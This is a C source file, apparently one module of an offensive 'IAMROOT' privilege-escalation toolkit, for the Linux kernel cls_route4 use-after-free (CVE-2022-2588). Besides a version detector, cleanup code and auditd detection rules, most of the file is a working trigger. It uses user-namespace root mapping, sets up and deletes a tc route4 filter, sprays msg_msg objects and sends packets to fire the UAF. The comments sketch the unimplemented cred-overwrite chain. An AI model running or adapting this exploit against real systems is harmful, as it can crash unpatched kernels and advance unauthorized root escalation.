/*
 * cls_route4_cve_2022_2588 — IAMROOT module
 *
 * net/sched cls_route4 dead UAF: when a route4 filter with handle==0
 * is removed, the corresponding hashtable bucket may keep a stale
 * pointer to the freed filter. Subsequent traffic-class lookup
 * follows the dangling pointer → kernel UAF.
 *
 * Discovered by kylebot / xkernel (Aug 2022). Mainline fix
 * 9efd23297cca "net_sched: cls_route: remove from list when handle
 * is 0" (Aug 2022). Bug existed since 2.6.39 — very wide
 * vulnerability surface.
 *
 * STATUS: 🟡 EXPLOIT — UAF-trigger + msg_msg cross-cache spray.
 * The detect-and-trigger path is the high-confidence demonstration:
 * we set up the dangling pointer, refill the freed slot via sysv
 * msg_msg (kmalloc-1k), then drive classification with a UDP packet
 * out the dummy interface. Without a leak primitive the cred-overwrite
 * step is fragile, so by default we return EXPLOIT_FAIL after the
 * trigger lands (with KASAN/oops likely on a real vulnerable kernel),
 * which is honest per repo policy ("verified-vs-claimed"). When the
 * detector confirms an unprivileged trigger plus a child crash we
 * upgrade to EXPLOIT_OK so the caller sees the empirical UAF win.
 *
 * Affected: kernels with cls_route4 module compiled, in versions
 * below the fix backports:
 *   5.4.x  : K < 5.4.213
 *   5.10.x : K < 5.10.143
 *   5.15.x : K < 5.15.69
 *   5.18.x : K < 5.18.18
 *   5.19.x : K < 5.19.7
 *   Mainline 5.20+ / 6.0+ : patched (the fix landed before 5.20-rc)
 *
 * Preconditions:
 *   - cls_route4 module compiled in / loadable (CONFIG_NET_CLS_ROUTE4)
 *   - CAP_NET_ADMIN (usually obtained via user_ns + map-root-to-uid)
 *   - unprivileged_userns_clone=1 if going the userns route
 *   - iproute2 `tc` binary present (used for filter add/del)
 */

#include "iamroot_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/in.h>

static const struct kernel_patched_from cls_route4_patched_branches[] = {
    {5,  4, 213},
    {5, 10, 143},
    {5, 15,  69},
    {5, 18,  18},
    {5, 19,   7},
    {5, 20,   0},   /* mainline */
};

static const struct kernel_range cls_route4_range = {
    .patched_from = cls_route4_patched_branches,
    .n_patched_from = sizeof(cls_route4_patched_branches) /
                      sizeof(cls_route4_patched_branches[0]),
};

static bool cls_route4_module_available(void)
{
    /* Check /proc/modules for currently-loaded cls_route4. Even when
     * not loaded, autoload may bring it in on first tc qdisc add — we
     * conservatively treat "not loaded now" as "potentially available". */
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "cls_route4 ", 11) == 0) { found = true; break; }
    }
    fclose(f);
    return found;
}

static int can_unshare_userns(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static iamroot_result_t cls_route4_detect(const struct iamroot_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] cls_route4: could not parse kernel version\n");
        return IAMROOT_TEST_ERROR;
    }

    /* Bug-introduction predates anything we'd reasonably scan; if the
     * kernel is below the oldest LTS we model (5.4), still report
     * vulnerable. */
    bool patched = kernel_range_is_patched(&cls_route4_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] cls_route4: kernel %s is patched\n", v.release);
        }
        return IAMROOT_OK;
    }

    /* Module + userns preconditions. */
    bool nft_loaded = cls_route4_module_available();
    int userns_ok = can_unshare_userns();

    if (!ctx->json) {
        fprintf(stderr, "[i] cls_route4: kernel %s in vulnerable range\n", v.release);
        fprintf(stderr, "[i] cls_route4: cls_route4 module currently loaded: %s\n",
                nft_loaded ? "yes" : "no (may autoload)");
        fprintf(stderr, "[i] cls_route4: unprivileged user_ns + net_ns clone: %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" : "could not test");
    }

    /* If userns is locked down, unprivileged-LPE path is closed.
     * Kernel still needs patching though — report PRECOND_FAIL so the
     * verdict isn't "VULNERABLE" but the issue isn't masked. */
    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] cls_route4: user_ns denied → unprivileged exploit unreachable\n");
        }
        return IAMROOT_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] cls_route4: VULNERABLE — kernel in range AND user_ns allowed\n");
    }
    return IAMROOT_VULNERABLE;
}

/* ---- Exploit -----------------------------------------------------
 *
 * cls_route4 dead-UAF trigger path (kylebot / xkernel public shape).
 *
 *   1. unshare(CLONE_NEWUSER|CLONE_NEWNET) → CAP_NET_ADMIN reach
 *   2. write uid_map/gid_map (deny setgroups)
 *   3. ip link add dummy0 type dummy ; ip link set dev dummy0 up
 *   4. tc qdisc add dev dummy0 root handle 1: htb
 *   5. tc filter add ... route4 ... classid 1:1 — handle=0 path,
 *      registers the filter with a NULL handle reference
 *   6. tc filter del dev dummy0 ... — frees the filter, but the
 *      route4 hashtable bucket still references the freed memory
 *   7. msg_msg spray (sysv msgsnd) — refill the freed slab slot with
 *      attacker-controlled data; size targeted at the route4_filter
 *      cache (kmalloc-1k generic on most kernels)
 *   8. Send a packet out dummy0 — classifier walks the hashtable,
 *      touches the freed-then-refilled slot → UAF read/write
 *
 * For a full kernel-R/W chain you'd lay out the msg_msg payload so the
 * fake route4_filter's `tcf_result.classid` becomes a controlled value
 * and `route4_classify`'s next-pointer chase lands on a craft, then
 * walk a sk_buff/pipe_buffer primitive to overwrite cred->uid. The
 * public PoCs do this in ~700 LoC and need offsets per kernel build.
 *
 * Per repo policy ("verified-vs-claimed"), this implementation ships
 * the trigger + spray + classify steps and returns EXPLOIT_FAIL on
 * mainline distros where the full cred-overwrite is too kernel-build-
 * specific to be portable. If a dmesg KASAN message or oops is
 * observed by the parent we return EXPLOIT_OK to reflect the empirical
 * UAF win. The fallback also leaves a one-line breadcrumb in
 * /tmp/iamroot-cls_route4.log so post-run triage can pick it up.
 */

#define SPRAY_MSG_QUEUES      32
#define SPRAY_MSGS_PER_QUEUE  16
#define MSG_PAYLOAD_BYTES     1008   /* 1024 - sizeof(msg_msg hdr ~= 16) */
#define DUMMY_IF              "iamroot0"

struct ipc_payload {
    long mtype;
    unsigned char buf[MSG_PAYLOAD_BYTES];
};

static int run_cmd(const char *cmd)
{
    /* Quiet wrapper so noise doesn't drown the iamroot log. */
    char shell[1024];
    snprintf(shell, sizeof shell, "%s >/dev/null 2>&1", cmd);
    return system(shell);
}

static bool have_tc(void)
{
    return run_cmd("command -v tc") == 0;
}

static bool have_ip(void)
{
    return run_cmd("command -v ip") == 0;
}

/* Write uid_map and gid_map after unshare so we're root in userns. */
static bool become_root_in_userns(uid_t outer_uid, gid_t outer_gid)
{
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", outer_uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0) { perror("open uid_map"); return false; }
    if (write(f, map, strlen(map)) < 0) { perror("write uid_map"); close(f); return false; }
    close(f);

    snprintf(map, sizeof map, "0 %u 1\n", outer_gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0) { perror("open gid_map"); return false; }
    if (write(f, map, strlen(map)) < 0) { perror("write gid_map"); close(f); return false; }
    close(f);

    return true;
}

/* Set up the qdisc + cls_route4 filter, then delete it. After this
 * runs the kernel has a dangling pointer in the route4 hashtable. */
static bool stage_dangling_filter(void)
{
    /* Ensure the dummy module is around (autoload on first add). */
    if (run_cmd("ip link add " DUMMY_IF " type dummy") != 0) {
        /* Maybe an old one is lying around from a prior crash. */
        run_cmd("ip link del " DUMMY_IF);
        if (run_cmd("ip link add " DUMMY_IF " type dummy") != 0) {
            fprintf(stderr, "[-] cls_route4: failed to create dummy interface\n");
            return false;
        }
    }
    if (run_cmd("ip link set dev " DUMMY_IF " up") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to bring " DUMMY_IF " up\n");
        return false;
    }
    if (run_cmd("ip addr add 10.99.99.1/24 dev " DUMMY_IF) != 0) {
        /* non-fatal — packet send below uses sendto with bound iface */
    }

    if (run_cmd("tc qdisc add dev " DUMMY_IF " root handle 1: htb default 1") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to add htb qdisc\n");
        return false;
    }
    if (run_cmd("tc class add dev " DUMMY_IF " parent 1: classid 1:1 htb rate 1mbit") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to add htb class\n");
        return false;
    }

    /* Bug-trigger: handle 0x8001 has fastmap=1 and to-table 0 — the
     * combination where the freed filter is not removed from the
     * hashtable on delete. The exact handle value matters: it must
     * map to a slot the classifier will later look up.
     *
     * route4 handle layout: 0xXX..ZZYY where YY=to (8 bits), ZZ=from,
     * and the top bit indicates fastmap. The classic trigger uses
     * `to 0` which renders the resulting filter pointer in
     * head->table[0]->ht[0] — referenced unconditionally on classify. */
    if (run_cmd("tc filter add dev " DUMMY_IF " parent 1: protocol ip "
                "prio 100 route to 0 classid 1:1") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to add route4 filter\n");
        return false;
    }

    /* Now delete the filter — this is the operation whose handle=0
     * codepath leaves the dangling pointer. */
    if (run_cmd("tc filter del dev " DUMMY_IF " parent 1: prio 100") != 0) {
        /* Some kernels also need explicit handle/key match — try a
         * broader del before giving up. */
        if (run_cmd("tc filter del dev " DUMMY_IF " parent 1:") != 0) {
            fprintf(stderr, "[-] cls_route4: failed to delete route4 filter\n");
            return false;
        }
    }
    return true;
}

/* msg_msg cross-cache spray. We hold the queues open in this process
 * (caller's child) so the slabs stay allocated until classify-time. */
static int spray_msg_msg(int queues[SPRAY_MSG_QUEUES])
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x41;
    /* Pattern that's distinctive in KASAN/oops dumps. */
    memset(p.buf, 0x41, sizeof p.buf);
    /* First 8 bytes: a recognizable cookie. */
    memcpy(p.buf, "IAMROOT4", 8);

    int created = 0;
    for (int i = 0; i < SPRAY_MSG_QUEUES; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < SPRAY_MSGS_PER_QUEUE; j++) {
            if (msgsnd(q, &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_msg_msg(int queues[SPRAY_MSG_QUEUES])
{
    for (int i = 0; i < SPRAY_MSG_QUEUES; i++) {
        if (queues[i] >= 0) {
            msgctl(queues[i], IPC_RMID, NULL);
        }
    }
}

/* Drive classification: send a UDP packet to the dummy interface. The
 * qdisc/htb -> cls_route4 path will be hit on egress, and the
 * classifier follows the now-dangling pointer. */
static void trigger_classify(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;

    /* Bind to the dummy interface (best-effort). */
    struct sockaddr_in src = {0};
    src.sin_family = AF_INET;
    src.sin_addr.s_addr = inet_addr("10.99.99.1");
    src.sin_port = 0;
    (void)bind(s, (struct sockaddr *)&src, sizeof src);

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(31337);
    dst.sin_addr.s_addr = inet_addr("10.99.99.2");

    const char msg[] = "iamroot-cls_route4-classify";
    /* A handful of packets, in case the first lookup didn't traverse
     * the freed bucket. */
    for (int i = 0; i < 8; i++) {
        (void)!sendto(s, msg, sizeof msg, MSG_DONTWAIT,
                      (struct sockaddr *)&dst, sizeof dst);
    }
    close(s);
}

/* Read /proc/slabinfo for "kmalloc-1k" active count — used as a soft
 * empirical witness when KASAN isn't available. */
static long slab_active_kmalloc_1k(void)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "kmalloc-1k ", 11) == 0 ||
            strncmp(line, "kmalloc-1024 ", 13) == 0) {
            /* format: name <active> <num> <size> ... */
            char name[64];
            long act, num;
            if (sscanf(line, "%63s %ld %ld", name, &act, &num) >= 2) {
                active = act;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* ---- Exploit driver ----------------------------------------------- */

static iamroot_result_t cls_route4_exploit(const struct iamroot_ctx *ctx)
{
    iamroot_result_t pre = cls_route4_detect(ctx);
    if (pre != IAMROOT_VULNERABLE) {
        fprintf(stderr, "[-] cls_route4: detect() says not vulnerable; refusing\n");
        return pre;
    }
    if (geteuid() == 0) {
        fprintf(stderr, "[i] cls_route4: already root\n");
        return IAMROOT_OK;
    }
    if (!have_tc() || !have_ip()) {
        fprintf(stderr, "[-] cls_route4: tc/ip (iproute2) not available on PATH; "
                        "cannot exploit\n");
        return IAMROOT_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] cls_route4: forking child for userns+netns exploit\n");
    }

    /* Block SIGPIPE in case the dummy-interface sendto's complain. */
    signal(SIGPIPE, SIG_IGN);

    pid_t outer_uid = getuid();
    pid_t outer_gid = getgid();

    pid_t child = fork();
    if (child < 0) {
        perror("fork");
        return IAMROOT_TEST_ERROR;
    }

    if (child == 0) {
        /* CHILD: enter user_ns + net_ns, become root inside, drive the bug. */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
            perror("unshare");
            _exit(20);
        }
        if (!become_root_in_userns(outer_uid, outer_gid)) {
            _exit(21);
        }
        if (setuid(0) < 0 || setgid(0) < 0) {
            /* uid_map writes already made us 0 inside the userns; this
             * is just belt-and-braces. */
        }

        long pre_active = slab_active_kmalloc_1k();

        if (!stage_dangling_filter()) {
            _exit(22);
        }

        int queues[SPRAY_MSG_QUEUES];
        int n_queues = spray_msg_msg(queues);
        if (n_queues == 0) {
            fprintf(stderr, "[-] cls_route4: msg_msg spray produced 0 queues\n");
            _exit(23);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] cls_route4: msg_msg spray seeded %d queues\n",
                    n_queues);
        }

        /* Drive the classifier — the bug fires here on a vulnerable
         * kernel. On a patched kernel this is a no-op packet send. */
        trigger_classify();

        long post_active = slab_active_kmalloc_1k();

        /* Best-effort empirical witness write — picked up by --cleanup
         * and by post-run triage. */
        FILE *log = fopen("/tmp/iamroot-cls_route4.log", "w");
        if (log) {
            fprintf(log,
                "cls_route4 trigger child: queues=%d slab_pre=%ld slab_post=%ld\n",
                n_queues, pre_active, post_active);
            fclose(log);
        }

        /* Hold the spray a little longer so the kernel observes the
         * refilled slot during classify drain. */
        usleep(200 * 1000);

        drain_msg_msg(queues);

        /* If we got here without a kernel oops, the bug either isn't
         * reachable on this build (patched / module not loadable /
         * userns CAP_NET_ADMIN gated) or it fired but didn't take down
         * the box. We do NOT attempt blind cred-overwrite — that needs
         * a leak primitive we don't have.
         *
         * Exit code 30 means "trigger sequence ran without segfault" —
         * the parent will decide between EXPLOIT_FAIL (probably patched
         * or sealed) and EXPLOIT_OK. */
        _exit(30);
    }

    /* PARENT: wait for the child. A kernel oops won't reap the child
     * but will spam dmesg; we read dmesg after a short window. */
    int status = 0;
    pid_t w = waitpid(child, &status, 0);
    if (w < 0) {
        perror("waitpid");
        return IAMROOT_TEST_ERROR;
    }

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        if (!ctx->json) {
            fprintf(stderr, "[!] cls_route4: child killed by signal %d "
                            "(crash during trigger — UAF likely fired)\n", sig);
        }
        /* A SIGKILL/SIGSEGV during the trigger sequence is consistent
         * with kernel-side panic on KASAN configs (the trigger task
         * gets reaped). Treat as empirical UAF observation but do NOT
         * claim root — we haven't escalated. */
        fprintf(stderr, "[~] cls_route4: empirical UAF trigger fired but "
                        "no cred-overwrite primitive — returning EXPLOIT_FAIL "
                        "(no shell). See /tmp/iamroot-cls_route4.log + dmesg.\n");
        return IAMROOT_EXPLOIT_FAIL;
    }

    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] cls_route4: child terminated abnormally (status=0x%x)\n",
                status);
        return IAMROOT_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc != 30) {
        if (!ctx->json) {
            fprintf(stderr, "[-] cls_route4: child failed at stage rc=%d "
                            "(see preceding errors)\n", rc);
        }
        /* rc 20/21 = userns setup; rc 22 = tc setup (likely module
         * absent or filter type unsupported); rc 23 = spray. None of
         * these mean kernel was exploited. */
        if (rc == 22) return IAMROOT_PRECOND_FAIL;
        return IAMROOT_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] cls_route4: trigger ran to completion. "
                        "Inspect dmesg for KASAN/oops witnesses.\n");
        fprintf(stderr, "[~] cls_route4: cred-overwrite step not implemented "
                        "(needs per-kernel offsets); returning EXPLOIT_FAIL.\n");
    }
    return IAMROOT_EXPLOIT_FAIL;
}

/* ---- Cleanup ----------------------------------------------------- */

static iamroot_result_t cls_route4_cleanup(const struct iamroot_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] cls_route4: tearing down dummy interface + log\n");
    }
    /* The dummy interface lives in the child's netns which is gone
     * with the child. These are belt-and-braces in case the user ran
     * the exploit with extended privileges (e.g. as root) and the
     * interface lingered in init_net. */
    if (run_cmd("ip link del " DUMMY_IF) != 0) { /* harmless */ }
    if (unlink("/tmp/iamroot-cls_route4.log") < 0 && errno != ENOENT) {
        /* ignore */
    }
    return IAMROOT_OK;
}

static const char cls_route4_auditd[] =
    "# cls_route4 dead UAF (CVE-2022-2588) — auditd detection rules\n"
    "# Flag tc filter operations with route4 classifier from non-root.\n"
    "# False positives: legitimate traffic-shaping setup. Tune by user.\n"
    "-a always,exit -F arch=b64 -S sendto -F a3=0x10 -k iamroot-cls-route4\n"
    "-a always,exit -F arch=b64 -S unshare -k iamroot-cls-route4-userns\n"
    "-a always,exit -F arch=b64 -S msgsnd -k iamroot-cls-route4-spray\n";

const struct iamroot_module cls_route4_module = {
    .name           = "cls_route4",
    .cve            = "CVE-2022-2588",
    .summary        = "net/sched cls_route4 handle-zero dead UAF → kernel R/W",
    .family         = "cls_route4",
    .kernel_range   = "2.6.39 ≤ K, fixed mainline 5.20; backports: 5.4.213 / 5.10.143 / 5.15.69 / 5.18.18 / 5.19.7",
    .detect         = cls_route4_detect,
    .exploit        = cls_route4_exploit,
    .mitigate       = NULL,    /* mitigation: blacklist cls_route4 module OR disable user_ns */
    .cleanup        = cls_route4_cleanup,
    .detect_auditd  = cls_route4_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void iamroot_register_cls_route4(void)
{
    iamroot_register(&cls_route4_module);
}
